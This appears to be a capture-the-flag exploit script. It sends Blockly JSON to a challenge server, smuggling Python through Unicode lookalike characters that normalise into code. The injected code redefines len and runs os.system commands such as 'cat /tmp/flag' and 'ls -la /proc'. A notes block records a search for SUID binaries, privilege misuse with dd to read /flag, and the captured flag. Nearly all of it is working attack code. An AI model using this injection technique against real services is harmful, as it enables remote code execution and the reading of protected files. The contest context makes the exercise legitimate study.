import requests

"""v1nd大哥的脚本
import requests
import unidecode

host="http://eci-2zeirp9f80b0rxfe0hmg.cloudeci1.ichunqiu.com:5000"
payload={
    "blocks":{
        "languageVersion":0,
        "blocks":[
            {
                "type":"text",
                "id":"e]W.L~w)W,CStEc*Polc",
                "x":179,
                "y":80,
                "fields":{
                    "TEXT":"1’\nlen\u207clambda x\u10381\nprint（\u2017\u2017import\u2017\u2017（‘os’）\u1362system（‘cat ／tmp／flag’））\n\u2580"
                    # 1'
                    # len=lambda x:1
                    # print(__import__('os').system('cat /tmp/flag'))
                }
            }
        ]
    }
}
r = requests.post(host+"/blockly_json", json=payload, timeout=5)
print(r.text)
print(unidecode.unidecode(u'1’\nlen\u207clambda x\u10381\nprint（\u2017\u2017import\u2017\u2017（‘os’）\u1362system（‘cat ／tmp／flag’））\n\u2580'))
# print(unidecode.unidecode('\u2017'))
"""

"""
测试过程

ls ﹣l ／flag

ls ﹣la ／proc

cat ／proc／1／cmdline # 输出: /bin/sh-cpython app.py0

find ／ ﹣user root ﹣perm ﹣4000 # 输出如下

    /bin/umount
    /bin/dd
    /bin/su
    /bin/mount
    /bin/ls
    /usr/bin/chfn
    /usr/bin/chsh
    /usr/bin/newgrp
    /usr/bin/passwd
    /usr/bin/gpasswd

dd if⁼／flag of⁼／tmp／flag
cat ／tmp／flag

flag{7c1a4fe8981e295a78508a49146340b9}
"""



host="http://eci-2ze6bhm7y89tv5q2wd5n.cloudeci1.ichunqiu.com:5000"

payload={
    "blocks":{
        "languageVersion":0,
        "blocks":[
            {
                "type":"text",
                "id":"e]W.L~w)W,CStEc*Polc",
                "x":179,
                "y":80,
                "fields":{
                    "TEXT":"＇﹔len⁼lambda x：0﹔os․system⁽＇ls ̄﹣la ／proc＇⁾﹔＇"
                }
            }
        ]
    }
}
r=requests.post(host+"/blockly_json",json=payload,timeout=5)
print(r.text)
